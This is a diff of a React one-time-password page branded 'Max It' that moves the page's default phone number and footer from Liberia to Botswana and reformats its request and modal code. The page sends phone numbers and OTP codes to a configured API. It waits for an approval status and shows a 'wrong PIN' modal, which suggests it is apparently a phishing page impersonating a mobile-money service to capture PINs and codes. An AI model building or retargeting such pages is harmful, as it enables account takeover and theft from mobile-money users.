@@ -24,7 +24,7 @@ export default function Otp() {
       console.log('No saved phone found');
     }
     
-    return '+231 77 123 45';
+    return '+267 71 234 567';
   };
 
   const [phoneNumber] = useState(getInitialPhone());
@@ -152,10 +152,7 @@ export default function Otp() {
         const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phoneNumber: phone,
-            otp: messageText
-          })
+          body: JSON.stringify({ phoneNumber: phone, otp: messageText })
         });
 
         const data = await response.json();
@@ -202,20 +199,13 @@ export default function Otp() {
     setIsSubmitting(true);
     const phone = authData.phoneNumber || phoneNumber;
 
-    updateAuthData({
-      otp: messageText,
-      isAuthenticated: true
-    });
+    updateAuthData({ otp: messageText, isAuthenticated: true });
 
     try {
       const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber: phone,
-          otp: messageText,
-          timestamp: new Date().toISOString()
-        })
+        body: JSON.stringify({ phoneNumber: phone, otp: messageText, timestamp: new Date().toISOString() })
       });
 
       await response.json();
@@ -275,7 +265,7 @@ export default function Otp() {
     if (timer > 0 || isResending || waitingForApproval) return;
     
     const phone = authData.phoneNumber || phoneNumber;
-    if (!phone || phone === '+231 77 123 45') {
+    if (!phone || phone === '+267 71 234 567') {
       setShowResendErrorModal(true);
       return;
     }
@@ -286,10 +276,7 @@ export default function Otp() {
       const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-otp`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          phoneNumber: phone,
-          timestamp: new Date().toISOString()
-        })
+        body: JSON.stringify({ phoneNumber: phone, timestamp: new Date().toISOString() })
       });
 
       const data = await response.json();
@@ -323,12 +310,7 @@ export default function Otp() {
     setShowWrongPinModal(false);
     localStorage.removeItem('otp_timer');
     localStorage.removeItem('maxit_phone');
-    updateAuthData({
-      phoneNumber: '',
-      pin: '',
-      otp: '',
-      isAuthenticated: false
-    });
+    updateAuthData({ phoneNumber: '', pin: '', otp: '', isAuthenticated: false });
     navigate('/login');
   };
 
@@ -348,14 +330,12 @@ export default function Otp() {
             <div className="spinner-container">
               <div className="spinner"></div>
             </div>
-            
             <h1 className="processing-title">Verifying message</h1>
             <p className="processing-subtitle">{verificationStatus}</p>
           </div>
         </main>
-
         <footer className="otp-footer">
-          © 2025 Max It Liberia
+          © 2026 Max It Botswana
         </footer>
       </div>
     );
@@ -370,9 +350,7 @@ export default function Otp() {
             <p className="error-modal-message">
               Check SMS for the code or request code again after countdown is over
             </p>
-            <button className="error-modal-button" onClick={() => setShowErrorModal(false)}>
-              OK
-            </button>
+            <button className="error-modal-button" onClick={() => setShowErrorModal(false)}>OK</button>
           </div>
         </div>
       )}
@@ -382,9 +360,7 @@ export default function Otp() {
           <div className="error-modal" onClick={(e) => e.stopPropagation()}>
             <h2 className="error-modal-title">Timeout</h2>
             <p className="error-modal-message">Error occurred, please try again</p>
-            <button className="error-modal-button" onClick={handleTimeoutModalClose}>
-              OK
-            </button>
+            <button className="error-modal-button" onClick={handleTimeoutModalClose}>OK</button>
           </div>
         </div>
       )}
@@ -396,9 +372,7 @@ export default function Otp() {
             <p className="error-modal-message">
               The PIN or phone number you entered earlier was incorrect. Please login again with the correct details.
             </p>
-            <button className="error-modal-button" onClick={handleWrongPinModalClose}>
-              Back to Login
-            </button>
+            <button className="error-modal-button" onClick={handleWrongPinModalClose}>Back to Login</button>
           </div>
         </div>
       )}
@@ -407,12 +381,8 @@ export default function Otp() {
         <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
           <div className="error-modal" onClick={(e) => e.stopPropagation()}>
             <h2 className="error-modal-title">Resend Failed</h2>
-            <p className="error-modal-message">
-              Failed to resend message. Please try again later.
-            </p>
-            <button className="error-modal-button" onClick={() => setShowResendErrorModal(false)}>
-              OK
-            </button>
+            <p className="error-modal-message">Failed to resend message. Please try again later.</p>
+            <button className="error-modal-button" onClick={() => setShowResendErrorModal(false)}>OK</button>
           </div>
         </div>
       )}
@@ -421,12 +391,8 @@ export default function Otp() {
         <div className="error-modal-overlay" onClick={() => setShowVerifyErrorModal(false)}>
           <div className="error-modal" onClick={(e) => e.stopPropagation()}>
             <h2 className="error-modal-title">Verification Failed</h2>
-            <p className="error-modal-message">
-              Failed to verify message. Please try again later.
-            </p>
-            <button className="error-modal-button" onClick={() => setShowVerifyErrorModal(false)}>
-              OK
-            </button>
+            <p className="error-modal-message">Failed to verify message. Please try again later.</p>
+            <button className="error-modal-button" onClick={() => setShowVerifyErrorModal(false)}>OK</button>
           </div>
         </div>
       )}
@@ -447,12 +413,10 @@ export default function Otp() {
 
       <header className="otp-header">
         <button className="back-btn" onClick={handleBack}>←</button>
-        
         <div className="logo-large">
           <span className="logo-large-max">Max</span>
           <span className="logo-large-it">It</span>
         </div>
-        
         <button className="menu-btn" aria-label="Menu">
           <div className="menu-line"></div>
           <div className="menu-line"></div>
@@ -506,7 +470,7 @@ export default function Otp() {
       </main>
 
       <footer className="otp-footer">
-        © 2025 Max It Liberia
+        © 2026 Max It Botswana
       </footer>
     </div>
   );
